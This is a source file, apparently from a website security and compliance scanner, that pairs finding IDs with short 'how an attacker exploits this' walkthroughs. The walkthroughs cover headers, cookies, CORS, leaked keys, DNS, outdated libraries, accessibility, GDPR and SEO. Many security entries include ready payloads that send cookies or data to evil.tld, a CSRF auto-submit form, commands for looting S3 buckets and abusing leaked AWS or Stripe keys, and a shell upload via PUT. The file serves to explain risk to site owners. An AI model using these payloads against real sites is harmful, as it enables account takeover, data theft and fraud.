  'no-https': [
    'Position on-path (same Wi-Fi / LAN / upstream ISP).',
    'Sniff plaintext HTTP: `tcpdump -A -i eth0 host target` — credentials, cookies, and form data are fully readable.',
    'Optionally inject/modify responses (e.g. swap a script) — nothing can detect tampering without a signature.',
  ],
  'hdr-strict-transport-security': [
    'Get on-path once while the user is on a plain-HTTP link (or a hostile network).',
    'Downgrade the very first request to http:// (SSL-strip) since there is no HSTS to force HTTPS.',
    'Serve a mirrored page over HTTP and capture the login as it is typed.',
  ],
  'hdr-content-security-policy': [
    'Find any input that reflects into the HTML or any third-party script the page loads.',
    'Inject `<script src="https://evil.tld/x.js"></script>` (only blocked if CSP exists).',
    'Script runs with the site origin → read `document.cookie`, call authenticated APIs, exfil via `new Image().src="https://evil.tld/?c="+document.cookie`.',
  ],
  'csp-weak': [
    'The policy contains `unsafe-inline`/`unsafe-eval` or a wildcard — look for the gap.',
    'With unsafe-inline: inject `<img src=x onerror=fetch("https://evil.tld/"+document.cookie)>` into any reflected field.',
    'With a wildcard script-src: host the payload on any allowed CDN and reference it.',
  ],
  'cookie-insecure': [
    'Same-Wi-Fi/LAN attacker runs `tcpdump -A port 80` or a MITM proxy.',
    'Trigger any plain-HTTP request to the site (mixed content, an http:// link, a downgrade).',
    'The browser attaches the cookie in cleartext (`Cookie: sid=...`) — copy it and `curl -H "Cookie: sid=..." https://target/account`.',
  ],
  'cookie-httponly': [
    'Find one XSS (reflected, stored, or via a compromised dependency).',
    'Payload: `<img src=x onerror="fetch(\'https://evil.tld/?c=\'+encodeURIComponent(document.cookie))">`.',
    'No HttpOnly means JS reads the session cookie → instant account takeover, no password needed.',
  ],
  'cookie-samesite': [
    'Set up a third-party page the victim visits while logged in.',
    'Auto-submit a form to the target: `<form action="https://target/email/change" method=post><input name=email value=attacker@evil.tld></form><script>document.forms[0].submit()</script>`.',
    'Cookie is sent cross-site → the action executes as the victim (CSRF).',
  ],
  'mixed-content': [
    'On-path attacker intercepts the specific http:// asset request.',
    'Replace a JS file/iframe with a malicious one (`<script>` swap).',
    'The injected code runs with the site origin and can read cookies/DOM and call the API.',
  ],
  'secret-leak': [
    'Anyone can `curl` the page/JS and read the key — no access needed.',
    'AWS key: `aws configure` with the leaked pair, then `aws sts get-caller-identity` → `aws s3 ls` → `aws s3 sync s3://bucket ./loot` (or `aws iam create-user` for persistence).',
    'Google API key: `curl "https://maps.googleapis.com/maps/api/geocode/json?address=x&key=LEAKED"` — billed to you until quota/limits bite.',
    'Stripe `sk_live_`: `curl https://api.stripe.com/v1/charges -u sk_live_...:` → `GET /v1/customers` to read customer list; `POST /v1/refunds` to move money.',
    'SendGrid/Slack/Firebase tokens: send mail as you, read Slack history, or read/write the Firebase DB with the key.',
  ],
  'js-secret': [
    'Download the JS bundle: `curl https://target/static/app.js | grep -oE "(AKIA|AIza|sk_live_|xox[baprs])[A-Za-z0-9_-]+"`.',
    'Take the key to the provider API as in `secret-leak` above.',
    'Check the key\'s own permissions with the provider\'s "whoami"/list endpoints and escalate to data access.',
  ],
  'infra-paths': [
    'Guess the referenced paths directly: `curl https://target/.env`, `/.git/config`, `/backup.zip`, `/.aws/credentials`.',
    'If `.env` is served: parse DB creds, `psql/mysql -h host -u user -p` and dump tables.',
    'If `.git` is exposed: `git-dumper https://target/.git ./repo` → `git log -p` to recover secrets from history.',
  ],
  'sourcemaps': [
    'Any visitor opens DevTools → Sources, or `curl https://target/app.js.map`.',
    'Recovered original source exposes internal endpoints, feature flags, and auth logic.',
    'Attack the now-known internal/admin endpoints directly (they are often less hardened than the public UI).',
  ],
  'insecure-form': [
    'On-path attacker sniffs the plain-HTTP form POST: `tcpdump -A port 80`.',
    'Read username/password/email straight out of the request body.',
    'Optionally modify the POST or redirect the form action to an attacker host.',
  ],
  'cors-wildcard-credentials': [
    'Host any page (or use an XSS on any site) the logged-in victim loads.',
    'Run: `fetch("https://target/api/me",{credentials:"include"}).then(r=>r.text()).then(t=>fetch("https://evil.tld/?d="+encodeURIComponent(t)))`.',
    'Because ACAO reflects/allow-* with credentials, the authenticated JSON is readable cross-origin → full account data exfil.',
  ],
  'cors-wildcard': [
    'Any site the victim (or an anonymous visitor) loads can read public responses.',
    '`fetch("https://target/api/...").then(r=>r.json())` — no credentials needed.',
    'Chain with any endpoint that leaks more than intended (IDs, internal data).',
  ],
  'disclosure': [
    'Read the version banner (`Server:`, `X-Powered-By:`).',
    '`searchsploit <product> <version>` for a matching public exploit.',
    'Fire the corresponding PoC against the target.',
  ],
  'dir-listing': [
    'Browse the autoindex pages (`/uploads/`, `/backup/`).',
    'Download anything sensitive: DB dumps, `.env`, source archives.',
    'Use recovered creds/paths to move to the next stage.',
  ],
  'http-methods': [
    'Probe: `curl -X OPTIONS -i https://target/`, `nmap --script http-methods target`.',
    'If `PUT`/WebDAV is open: `curl -T shell.jsp https://target/uploads/` then request the uploaded file.',
    'If `TRACE` is open, use it for XST/cookie theft in legacy setups.',
  ],
  'open-redirect': [
    'Build a link to the trusted domain that redirects out, e.g. `https://target/login?next=https://evil.tld`.',
    'Send it to victims — the visible host is the trusted domain, the landing page is the attacker\'s.',
    'Harvest credentials on the convincing phishing clone, or steal OAuth/SSO tokens as they pass through the redirect.',
  ],
  'reflected-input': [
    'Find a param echoed back unescaped: `https://target/search?q=<marker>`.',
    'Escalate the marker to a real payload: `?q=<svg/onload=fetch("https://evil.tld/"+document.cookie)>`.',
    'Deliver the crafted link to victims (or store it where it will be viewed) — payload runs in the site origin.',
  ],
  'host-header': [
    'Send a request with an attacker-controlled Host: `curl -H "Host: evil.tld" https://target/`.',
    'If it is reflected into password-reset links or caches, follow that vector.',
    'Poison the reset link → victim clicks it → token lands on attacker host → account takeover.',
  ],
  'graphql-introspection': [
    'Dump the schema: `curl -X POST https://target/graphql -d \'{"query":"{__schema{types{name fields{name}}}}"}\'`.',
    'Enumerate all queries/mutations, including internal/admin-only fields.',
    'Call sensitive mutations directly (bypassing the UI) with the victim\'s or your own token.',
  ],
  'api-error-verbose': [
    'Trigger errors with malformed input: `curl "https://target/api/x?id=\'"`.',
    'Read stack traces for framework versions, file paths, and DB queries.',
    'Use the leaked details to craft SQLi/RCE payloads or locate source files.',
  ],
  'bucket-public': [
    'Take the bucket name from the page and list it anonymously: `aws s3 ls s3://bucket --no-sign-request`.',
    'Download/sync everything: `aws s3 sync s3://bucket ./loot --no-sign-request`.',
    'Write if allowed: `aws s3 cp shell.html s3://bucket/ --no-sign-request` → defacement/host malware.',
  ],
  'exposed-path': [
    'Request the exposed file directly: `curl -i https://target/.env`, `/wp-config.php.bak`, `/server-status`.',
    'Parse out credentials/keys from the response.',
    'Use them against the DB, cloud, or admin panel as in `secret-leak`.',
  ],
  'hsts-weak-maxage': [
    'On-path attacker waits for the HSTS entry to expire (short max-age).',
    'Re-downgrade the next request to http:// and strip TLS again.',
    'Repeat the sslstrip login capture until the header is fixed to a long max-age.',
  ],
  'hsts-no-preload': [
    'First-visit downgrade: the very first HTTP request has no HSTS yet to upgrade it.',
    'SSL-strip that first request before the browser ever sees the HSTS header.',
    'Preload is the only defence for that first hop.',
  ],
  'hdr-cross-origin-opener-policy': [
    'Open the target in a popup/window from an attacker page.',
    'With no COOP the attacker keeps a `window.opener` reference to the target.',
    'Read/mutate the target\'s window (Spectre-class side channels, or navigate it to a phishing clone).',
  ],
  'hdr-cross-origin-embedder-policy': [
    'Embed the target as a cross-origin iframe/resource.',
    'Without COEP the page can load un-credentialed cross-origin resources unsafely.',
    'Enables cross-origin timing side channels and reduces process isolation.',
  ],
  'hdr-cross-origin-resource-policy': [
    'Hotlink/embed the target\'s resources from an attacker page.',
    'Without CORP, responses can be pulled into cross-origin contexts.',
    'Use it for data exfil via side channels or resource-based attacks.',
  ],
  'csp-no-default-src': [
    'There is no default-src fallback, so unspecified fetch directives are unrestricted.',
    'Inject `<script src="https://evil.tld/x.js">` via any injection point.',
    'Script runs in-origin and exfiltrates cookies/data.',
  ],
  'csp-no-base-uri': [
    'Find any HTML injection point (even a partial one).',
    'Inject `<base href="https://evil.tld/">` to hijack all relative URLs.',
    'Subsequent relative scripts/images now load from the attacker host.',
  ],
  'csp-no-frame-ancestors': [
    'Embed the target in an invisible iframe on an attacker page.',
    'Overlay fake UI (clickjacking): `<iframe src="https://target/account" style="opacity:0">` over a decoy button.',
    'Victim clicks what they think is the decoy — they actually click the target (delete account, confirm transfer).',
  ],
  'csp-no-object-src': [
    'Inject `<object data="https://evil.tld/plugin.swf"></object>` or a legacy plugin.',
    'The plugin context can bypass script-src restrictions.',
    'Run script or read data from within the plugin.',
  ],
  'csp-no-trusted-types': [
    'Find a DOM-XSS sink (`innerHTML`, `eval`, `document.write`).',
    'Without Trusted Types, a plain string reaches the sink unfiltered.',
    'Same-XSS impact: run in-origin script, steal session.',
  ],
  'csp-no-upgrade-insecure': [
    'On-path attacker intercepts http:// subresource requests that are not auto-upgraded.',
    'Swap the resource for a malicious one.',
    'Payload runs in-origin (mixed-content style).',
  ],
  'csp-http-source': [
    'The CSP allows http:// origins in a directive.',
    'Intercept that cleartext resource request on-path.',
    'Serve a malicious script/iframe from the allowed http origin.',
  ],
  'no-cache': [
    'Shared cache / proxy stores the authenticated response.',
    'Later, an unauthenticated request retrieves the cached private page.',
    'Read another user\'s data from the cache (cache poisoning / leak).',
  ],
  'http-redirect': [
    'Follow the redirect chain manually: `curl -IL https://target`.',
    'Look for a hop that crosses to http:// or an attacker-controlled host.',
    'Downgrade/inject at that hop.',
  ],
  'inline-scripts': [
    'Find an injection point that lands inside an existing inline script block.',
    'Break out with `</script><script>fetch("https://evil.tld/"+document.cookie)</script>`.',
    'Inline execution means no external URL to block — CSP hash/nonce is the only fix.',
  ],
  'no-compression': [
    'Larger responses transfer more slowly, widening the on-path window.',
    'On a hostile network, more data/time to capture and tamper with.',
    'Performance-only: no direct exploit, but it feeds other on-path attacks.',
  ],
  'no-security-txt': [
    'You cannot find a security contact to report a bug you found.',
    'An attacker is not incentivised to disclose, so they weaponise it first.',
    'No coordinated-disclosure channel → longer exposure window.',
  ],
  'deprecated': [
    'The page uses a deprecated platform feature an attacker knows is unpatched.',
    'Consult the deprecation\'s known CVE/behaviour change.',
    'Exploit the documented weakness the feature now carries.',
  ],
  'deprecated-document-domain': [
    'Cross-origin iframe sets `document.domain` to relax the same-origin policy.',
    'Now a sibling subdomain (or attacker-controlled page on one) can read it.',
    'Read cross-subdomain data / run script in the relaxed origin.',
  ],
  'dns-spf': [
    'Register a lookalike envelope sender with any SMTP provider.',
    'Send mail with `MAIL FROM:` spoofed to @yourdomain — no SPF to reject it.',
    'Land convincing phishing in customer inboxes.',
  ],
  'dns-dmarc': [
    'Spoof the domain with no DMARC policy to stop it.',
    'Send CEO-fraud / invoice-fraud mail that receivers have no rule to reject.',
    'Wire the money before anyone verifies.',
  ],
  'dns-dnssec': [
    'Intercept DNS resolution on-path (public Wi-Fi, rogue resolver).',
    'Answer with an attacker IP for the target domain — no DNSSEC signature to reject it.',
    'Serve a full MITM clone at the attacker IP.',
  ],
  'dns-caa': [
    'Trick (or compromise) any CA into issuing a cert for the domain.',
    'No CAA record restricts which CA may issue.',
    'Use the valid cert to impersonate the site with a trusted padlock.',
  ],
  'dns-mta-sts': [
    'Strip/downgrade STARTTLS on the MX path (SMTP MITM).',
    'Read mail in the clear, including password resets and 2FA codes.',
    'MTA-STS is the only thing that forces TLS on inbound mail.',
  ],
  'dns-tls-rpt': [
    'The downgrade above happens without anyone being told.',
    'No TLS-RPT means no report is generated.',
    'The SMTP interception continues silently.',
  ],
  'server-version-leak': [
    'Attacker parses HTTP headers to retrieve exact software banner.',
    'Queries public CVE databases (NVD, Exploit-DB) for matching vulnerabilities.',
    'Executes targeted exploits without needing blind discovery.',
  ],
  'vuln-php-eol': [
    'Attacker identifies exposed End-of-Life PHP banner.',
    'Targets unpatched CGI argument injection (CVE-2024-4577) or multipart parser buffer flaws.',
    'Executes arbitrary shell commands with web server privileges.',
    'Establishes persistence via webshell and extracts database credentials.',
  ],
  'vuln-php-81-eol': [
    'Attacker scans for PHP 8.1 specific vulnerabilities and memory safety gaps.',
    'Leverages unpatched upstream bugs to trigger denial of service or code injection.',
  ],
  'vuln-apache-outdated': [
    'Attacker sends encoded characters or UNC paths through mod_rewrite / mod_proxy.',
    'Bypasses authentication or triggers internal SSRF (CVE-2024-38472 / CVE-2024-38475).',
    'Escapes proxy context to execute scripts or access protected administrative backends.',
  ],
  'vuln-nodejs-eol': [
    'Attacker crafts pipeline HTTP requests with conflicting Content-Length / Transfer-Encoding.',
    'Triggers HTTP request smuggling or permission model bypasses in unpatched Node.js core.',
    'Poisons intermediate caches and hijacks other user sessions.',
  ],
  'vuln-nginx-outdated': [
    'Attacker sends crafted HTTP/2 or HTTP/3 frames to trigger worker process crashes.',
    'Maintains denial of service against web server worker processes.',
  ],
  'vuln-jquery-outdated': [
    'Attacker submits payload containing malicious HTML elements (e.g. <style><img src=x onerror=...>).',
    'Bypasses old htmlPrefilter regex sanitization in jQuery < 3.5.0.',
    'Executes arbitrary JavaScript in victim browser sessions.',
  ],
  'vuln-angularjs-eol': [
    'Attacker inputs client-side template expressions into page inputs.',
    'Escapes AngularJS sandbox to execute arbitrary JS in user browser context.',
    'Steals user credentials and session tokens.',
  ],
  'vuln-polyfill-malicious': [
    'Attacker / rogue CDN inspects incoming HTTP request headers.',
    'Identifies eligible client devices (e.g. mobile Safari / Chrome).',
    'Injects obfuscated redirect or malicious payload leading to phishing or fraud.',
  ],
  'vuln-wordpress-outdated': [
    'Attacker scans publicly readable generator meta tag or asset versions.',
    'Identifies vulnerable WordPress core version.',
    'Sends public exploit payload to trigger privilege escalation or media SSRF.',
    'Establishes persistence via malicious plugin installation.',
  ],
  'vuln-nextjs-ssrf': [
    'Attacker submits Server Action POST request with spoofed Host header.',
    'Next.js server follows internal redirect based on unvalidated Host header.',
    'Extracts internal microservice data or cloud metadata credentials.',
  ],
  'vuln-lodash-outdated': [
    'Attacker sends JSON payload with __proto__ properties to API or form.',
    'Outdated Lodash utility merges properties into global Object prototype.',
    'Alters application control flow or triggers remote code execution.',
  ],
  'vuln-bootstrap-outdated': [
    'Attacker crafts payload containing malicious data-attribute (e.g. data-template).',
    'Outdated Bootstrap component renders attribute directly to DOM without escaping.',
    'Executes arbitrary JavaScript in victim browser context.',
  ],
  'vuln-moment-redos': [
    'Attacker sends crafted date string with repetitive pattern.',
    'Vulnerable regex in Moment.js triggers exponential backtracking.',
    'Server or browser CPU spikes to 100%, causing denial of service.',
  ],
  'vuln-axios-outdated': [
    'Attacker sets up redirect endpoint on external domain.',
    'Triggers application request using Axios to redirect target.',
    'Outdated Axios leaks original Authorization header to attacker domain.',
  ],
  'trackers': [
    'N/A to an external attacker — this is a data-sharing/privacy exposure.',
    'The named third parties receive user identifiers as users browse.',
    'Combine with no-consent: regulators can fine you and users can claim damages (GDPR Art. 82).',
  ],
  'no-consent': [
    'Cookies/trackers fire before any consent banner is answered.',
    'Regulator (or a claimant) shows pre-consent identifiers reached ad-tech.',
    'GDPR fines up to 4% of turnover + individual compensation claims.',
  ],
  'consent-present': [
    'N/A — a control is present. Verify it is not a dark pattern.',
    'Check that "Reject all" is as easy as "Accept all" (EDPB requirement).',
    'Unequal buttons are themselves a compliance violation.',
  ],
  'policy-': [
    'Verify the legal pages exist and are reachable without a login.',
    'Missing privacy/cookie policy = no lawful basis documented.',
    'Regulators treat the absence as an aggravating factor in any complaint.',
  ],
  'data-residency': [
    'N/A to an attacker — a transfer-law exposure.',
    'User data flows to non-EU processors/hosts.',
    'Without SCCs/DPF the transfer is unlawful (Schrems II).',
  ],
  'hdr-': [
    'The named security response header is absent.',
    'Replay the matching attack from the `hdr-*` walkthrough relevant to it.',
    'Missing headers are additive risk — each removes one browser-side defence.',
  ],
  'hdr-deprecated-': [
    'The legacy header is still set (`X-XSS-Protection`, `Expect-CT`, ...).',
    'It implies an old stack; scan the version banners for matching CVEs.',
    'Exploit the outdated component it reveals.',
  ],
  'a11y-alt': [
    'N/A to an attacker — accessibility/quality gap.',
    'Screen-reader users cannot perceive images without alt text.',
    'Fails WCAG 2.2 AA → EAA/EU accessibility exposure and exclusion of users.',
  ],
  'tech-detected': [
    'Fingerprint the exact stack from the page (versions, build IDs).',
    '`searchsploit <product> <version>` for a matching CVE, and check the vendor changelog.',
    'Fire the public PoC against the identified version.',
  ],
  'page-weight': [
    'N/A to an attacker directly — cost/performance exposure.',
    'Heavy pages drain mobile data and increase bounce/timeout.',
    'On slow networks they widen the on-path window for other attacks.',
  ],
  'img-format': [
    'N/A to an attacker — asset-hygiene issue.',
    'Legacy formats (PNG/JPEG where AVIF/WebP fits) inflate transfer size.',
    'Slower LCP and higher bandwidth cost.',
  ],
  'render-blocking': [
    'N/A to an attacker — performance issue.',
    'Blocking CSS/JS delays first paint and interactivity.',
    'Higher INP/LCP → measurable conversion loss.',
  ],
  'broken-link': [
    'Crawlers and users hit dead ends (`404`/`5xx`).',
    'Search engines waste crawl budget and drop rankings.',
    'Some broken links may leak removed pages/paths to anyone probing.',
  ],
  'seo-sitemap': [
    'No sitemap means crawlers discover pages slowly/incompletely.',
    'Rival/low-quality pages can outrank you on your own topics.',
    'Weak discoverability also hides pages from AI crawlers you may want.',
  ],
  'seo-robots': [
    'Missing / unreadable robots.txt removes crawler guidance.',
    'Crawlers guess, and can index or ignore pages unpredictably.',
    'Attackers can also read a missing policy as an unmanaged surface.',
  ],
  'seo-robots-block': [
    'robots.txt blocks pages you likely want indexed.',
    'Search visibility drops for those URLs.',
    'Note: robots.txt is not a security control — blocked paths are still publicly reachable.',
  ],

  /* ------------------------------------------------------------------ *
   * Exploit walkthroughs for the families that previously fell through
   * to GENERIC_EXPLOIT. Non-attack (accessibility / SEO / performance /
   * compliance) entries say so explicitly, as the plan requires, instead
   * of the misleading "reproduce it manually" generic steps.
   * ------------------------------------------------------------------ */

  /* ---- accessibility: no attacker, real user impact ---- */
  'a11y-alt': [
    'N/A to an attacker — this excludes screen-reader users.',
    'Load the page with a screen reader (NVDA/VoiceOver).',
    'Listen to how the image is announced: "image" with no description.',
    'The user cannot identify the content, so they abandon the page.',
  ],
  'a11y-alt-rendered': [
    'N/A to an attacker — assistive-tech users are excluded.',
    'Open the URL and let JavaScript finish rendering.',
    'Run the injected images through a screen reader.',
    'Injected images announce with no text alternative, unlike the static ones.',
  ],
  'a11y-autocomplete': [
    'N/A to an attacker — users with motor/cognitive disabilities are slowed down.',
    'Tab to a personal-data field (name, email, address).',
    'Observe that the browser offers no autofill suggestion.',
    'The user must hand-type every value, increasing errors and abandonment.',
  ],
  'a11y-autoplay': [
    'N/A to an attacker — it hijacks the user audio channel.',
    'Load the page with sound on.',
    'Media starts playing with no visible pause or stop control.',
    'Screen-reader output is drowned out; the user cannot stop it.',
  ],
  'a11y-button-semantics': [
    'N/A to an attacker — keyboard users cannot activate the control.',
    'Tab to a link that acts as a button.',
    'Press Enter — nothing happens (there is no href).',
    'The action is unreachable without a mouse.',
  ],
  'a11y-contrast': [
    'N/A to an attacker — low-vision users cannot read the text.',
    'Sample the failing text/background pair.',
    'Compute the ratio (DevTools or a contrast checker) — it is below 4.5:1.',
    'The text is unreadable in bright light or with colour-vision deficiency.',
  ],
  'a11y-focus-visible': [
    'N/A to an attacker — keyboard users lose their position.',
    'Press Tab repeatedly through the page.',
    'Observe that no focus ring appears on controls.',
    'The user cannot tell which control will activate, so navigation stalls.',
  ],
  'a11y-h1': [
    'N/A to an attacker — the document outline is ambiguous.',
    'Open the page with a screen reader and list the headings.',
    'No level-1 heading is announced.',
    'The page topic is unclear to non-visual users and to crawlers.',
  ],
  'a11y-h1-multi': [
    'N/A to an attacker — the heading outline is flattened.',
    'List all headings on the page.',
    'More than one <h1> is returned.',
    'Screen-reader navigation cannot tell which heading is the page topic.',
  ],
  'a11y-heading-order': [
    'N/A to an attacker — non-visual navigation breaks.',
    'Walk the heading list and note a jump such as h2 to h4.',
    'Jump to headings; the skipped level is never announced.',
    'Sections nested under the gap become unreachable by heading jump.',
  ],
  'a11y-label': [
    'N/A to an attacker — screen-reader and voice users are blocked.',
    'Tab to a form control with the screen reader running.',
    'It announces "edit" or "button" with no name.',
    'The user cannot tell what to enter, so checkout/signup stalls.',
  ],
  'a11y-landmark': [
    'N/A to an attacker — assistive tech cannot skip to the content.',
    'Load the page with a screen reader and list landmarks.',
    'No <main> landmark is present.',
    'The user must tab through the entire navigation on every page.',
  ],
  'a11y-lang': [
    'N/A to an attacker — screen readers guess the language.',
    'Open the page with a screen reader.',
    'It reads the content in the default/OS language, not the page language.',
    'Pronunciation is wrong and the content is hard to understand.',
  ],
  'a11y-link-text': [
    'N/A to an attacker — link purpose is lost.',
    'List all links on the page with a screen reader.',
    'Several read identically as "click here" or "read more".',
    'Out of context the user cannot tell where any link leads.',
  ],
  'a11y-live-region': [
    'N/A to an attacker — dynamic updates are silent.',
    'Trigger a UI update (add to cart, submit with an error).',
    'The screen reader announces nothing.',
    'The user believes the app is frozen and retries or leaves.',
  ],
  'a11y-reduced-motion': [
    'N/A to an attacker — motion-sensitive users are affected.',
    'Enable "reduce motion" in the OS/browser.',
    'Reload the page — animations still play unchanged.',
    'Vestibular symptoms and nausea can follow; the user leaves.',
  ],
  'a11y-skip-link': [
    'N/A to an attacker — keyboard users pay the navigation cost.',
    'Press Tab once on page load.',
    'No "skip to content" link appears first.',
    'The user must tab through every nav item on every page.',
  ],
  'a11y-statement': [
    'N/A to an attacker — a compliance/transparency gap.',
    'Look for an accessibility statement link in the footer.',
    'None is present.',
    'Users cannot report barriers or see your conformance target.',
  ],
  'a11y-table-headers': [
    'N/A to an attacker — tabular data is unusable non-visually.',
    'Navigate a data table with a screen reader.',
    'Cells are announced with no column header.',
    'The user hears a stream of numbers with no meaning.',
  ],
  'a11y-title': [
    'N/A to an attacker — page orientation is lost.',
    'Check the browser tab and the screen reader announcement.',
    'No meaningful page name is shown.',
    'Users cannot distinguish this tab from others open to the same site.',
  ],
  'a11y-zoom': [
    'N/A to an attacker — low-vision users cannot magnify.',
    'Try to pinch-zoom on a phone.',
    'The viewport meta blocks scaling.',
    'The user is stuck with text they cannot enlarge.',
  ],

  /* ---- EU / GDPR compliance ---- */
  'eu-no-cmp': [
    'Visit the site with a clean profile and the network tab open.',
    'Observe non-essential cookies/identifiers being set before any choice.',
    'No consent mechanism blocks them (no prior, informed consent).',
    'A regulator (or any user) can demonstrate unlawful pre-consent processing with a HAR file.',
  ],
  'eu-consent-mode-default': [
    'Inspect the consent-default call before any tag fires.',
    'Observe analytics_storage/ad_storage are not set to "denied".',
    'Tags fire and write identifiers while the user has not opted in.',
    'The default state itself is the breach.',
  ],
  'eu-pre-consent-firing': [
    'Load the site with a clean profile and capture the network log.',
    'Match the tracker requests against the timestamp of consent.',
    'Requests appear before any consent action.',
    'Proves an ePrivacy Art. 5(3) violation with a single HAR export.',
  ],
  'eu-third-party-cookie': [
    'Load the site and list Set-Cookie domains.',
    'Note cookies set on a registrable domain you do not own.',
    'The third party receives identifiers from your visitors.',
    'An undocumented third-country transfer under GDPR Art. 44.',
  ],
  'eu-ai-act-disclosure': [
    'Interact with the AI feature as a normal user.',
    'No notice states that the counterpart is an AI system.',
    'Generated media carries no machine-readable marking.',
    'An EU AI Act Art. 50 transparency failure.',
  ],
  'eu-dsa-trader-info': [
    'Open the online-sales page.',
    'Check for trader name, address and contact details.',
    'The required DSA trader information is missing.',
    'A DSA authority can restrict trading for non-compliance.',
  ],
  'eu-data-transfer': [
    'Fingerprint the third-party infrastructure from the page.',
    'Identify the sub-processor and its region.',
    'No DPA / SCC chain is documented for the transfer.',
    'A GDPR Chapter V breach and a reportable incident.',
  ],
  'eu-cookie-no-reject-button': [
    'Visit the site with no existing cookies stored.',
    'Observe the cookie consent banner displays an "Accept" button, but no immediate "Reject" button.',
    'Rejecting cookies requires navigating into settings or submenus, violating EDPB equal-prominence standards.',
    'Forms grounds for regulatory action and consumer protection fines.',
  ],
  'eu-preticked-consent': [
    'Inspect forms on the page containing consent or newsletter checkboxes.',
    'Observe that the checkbox element has the "checked" attribute pre-selected by default.',
    'Under CJEU Planet49 and GDPR Art. 4(11), silence or pre-ticked boxes do not constitute active consent.',
    'Regulators treat any collected emails or data as unlawfully processed.',
  ],
  'us-gpc-optout': [
    'Send an HTTP request with the "Sec-GPC: 1" header or inspect footer links.',
    'Observe the page loads marketing/advertising trackers without providing "Your Privacy Choices" or honoring GPC.',
    'Fails CCPA/CPRA, TDPSA, and Colorado/Connecticut opt-out mandate.',
    'Triggers state AG investigation and civil liability.',
  ],
  'privacy-session-replay': [
    'Inspect page network requests and scripts for session replay tools (Hotjar, FullStory, Clarity, Smartlook).',
    'Observe the script initializing and recording DOM events immediately on page load prior to consent.',
    'No conspicuous wiretapping disclosure or prior affirmative consent is provided.',
    'Forms the evidentiary basis for class-action lawsuits under CIPA § 631.',
  ],

  /* ---- active / probe findings ---- */
  'crossdomain-policy': [
    'Fetch /crossdomain.xml and /clientaccesspolicy.xml.',
    'Observe a wildcard or permissive allow-domain list.',
    'Any site the victim visits can read authenticated responses (Flash-era).',
    'Delete the files — they are pure surface with no modern benefit.',
  ],
  'bucket-referenced': [
    'No exploit — this is the correct configuration (no anonymous listing).',
    'Confirm the bucket still refuses anonymous ListBucket.',
    'Keep public-access-block on and rotate app credentials.',
    'Informational finding; no attacker action available.',
  ],
  'ws-insecure': [
    'Join the same network as a victim (public Wi-Fi, rogue AP, ARP spoof).',
    'Sniff the ws:// stream with `wireshark` / `tcpdump`.',
    'Read tokens and messages, or inject frames into the socket.',
    'Session takeover and full control of the realtime channel.',
  ],
  'ws-endpoints': [
    'Discover the socket endpoint from the page bundle.',
    'Connect and enumerate channels/messages.',
    'Probe whether authorization is checked per-message or only at connect.',
    'Missing per-object checks let you read other users channels.',
  ],
  'sri-missing': [
    'Identify the third-party script URL without an integrity attribute.',
    'Compromise the CDN, its DNS, or publish a malicious version.',
    'The browser executes it as same-origin code on every page load.',
    'Full DOM, cookie and network access in your origin — supply-chain XSS.',
  ],
  'third-party-surface': [
    'List every external script host the page loads.',
    'For each: check availability, region and data it receives.',
    'A dead or breached host degrades or compromises the page.',
    'Reduce the surface by self-hosting and removing non-essential tags.',
  ],
  'pii-exposure': [
    'View the page source or download the JS bundle.',
    'Grep for IBAN/card-shaped numbers.',
    'Personal and financial data is readable by anyone.',
    'GDPR Art. 33/34 breach — mandatory notification plus fraud risk.',
  ],
  'pii-iban': [
    'Download the HTML/JS bundle and extract IBAN-shaped values.',
    'Pair an IBAN with a name found nearby.',
    'Attempt a SEPA direct-debit mandate with those details.',
    'Payment fraud and a GDPR Art. 34 breach-notification event.',
  ],
  'public-company-trr': [
    'View the public company bank account in footer / payment terms.',
    'Use for legitimate wire transfer or invoice settlement.',
    'No security vulnerability — corporate TRR publication is standard EU practice.',
  ],

  /* ---- Shodan InternetDB findings ---- */
  'shodan-exposed-db': [
    'Scan the host IP with nmap or Shodan to identify the open database port.',
    'Attempt direct unauthenticated connection or brute-force database credentials.',
    'Execute administrative commands or queries to dump customer data and tables.',
    'Wipe or encrypt the database and leave a ransom note.',
  ],
  'shodan-exposed-remote-mgmt': [
    'Locate the open management port (RDP 3389, VNC 5900, Telnet 23) via Shodan.',
    'Launch automated credential stuffing or password brute-force against administrative user accounts.',
    'Check for unpatched remote code execution vulnerabilities (e.g. BlueKeep) against the service.',
    'Establish an interactive remote desktop or shell session and pivot through internal infrastructure.',
  ],
  'shodan-known-cve': [
    'Query Shodan InternetDB for the target IP to retrieve indexed CVE identifiers.',
    'Cross-reference CVEs with public exploit repositories (Exploit-DB, GitHub POCs, Metasploit).',
    'Send exploit payloads matching the target software and version.',
    'Gain unauthorized code execution or extract sensitive server memory.',
  ],
  'shodan-ssh-open': [
    'Connect to port 22 to banner-grab the SSH software version.',
    'Run automated password dictionary attacks against common usernames (root, admin, deploy).',
    'Test for CVEs matching specific OpenSSH release versions.',
    'Gain shell access if password authentication is permitted or credentials are compromised.',
  ],

  /* ---- Google CrUX field data findings ---- */
  'crux-field-fast': [
    'No exploit — this is a positive real-user performance assessment.',
    'Google CrUX 28-day field data confirms real mobile Chrome users experience fast loading and smooth interactivity.',
    'Continue monitoring Core Web Vitals in Google Search Console to prevent regressions.',
    'Maintain performance budgets for JavaScript bundles and media assets.',
  ],
  'crux-field-slow': [
    'Review Core Web Vitals metrics (LCP, INP, CLS) in Google PageSpeed Insights and Search Console.',
    'Identify render-blocking resources, unoptimized hero images, or heavy main-thread JavaScript execution.',
    'Refactor frontend assets, implement server-side caching, and optimize critical rendering paths.',
    'Measure improvements over the rolling 28-day CrUX measurement window.',
  ],

  /* ---- Certificate Transparency reconnaissance findings ---- */
  'ct-exposed-staging': [
    'Inspect public Certificate Transparency (CT) logs for SSL certificates issued for dev/staging subdomains.',
    'Test discovered subdomains for missing authentication, default credentials, or exposed debug bars.',
    'Extract sensitive environment configuration, test credentials, or internal API documentation.',
    'Leverage staging access to pivot toward production systems or databases.',
  ],

  /* ---- SEO: no attacker, discoverability/ranking impact ---- */
  'seo-title': [
    'N/A to an attacker — this is a search-visibility issue.',
    'Check the SERP snippet for the page.',
    'The title is absent, so the engine invents one.',
    'Lower, unpredictable click-through.',
  ],
  'seo-title-len': [
    'N/A to an attacker — a SERP truncation issue.',
    'Search for the page and read the result title.',
    'It is cut off or too thin.',
    'Weaker click-through and wasted keyword targeting.',
  ],
  'seo-desc': [
    'N/A to an attacker — snippet quality degrades.',
    'Search for the page.',
    'No meta description exists, so the snippet is scraped text.',
    'Less persuasive results and lower click-through.',
  ],
  'seo-desc-len': [
    'N/A to an attacker — snippet truncation.',
    'Search for the page and read the description.',
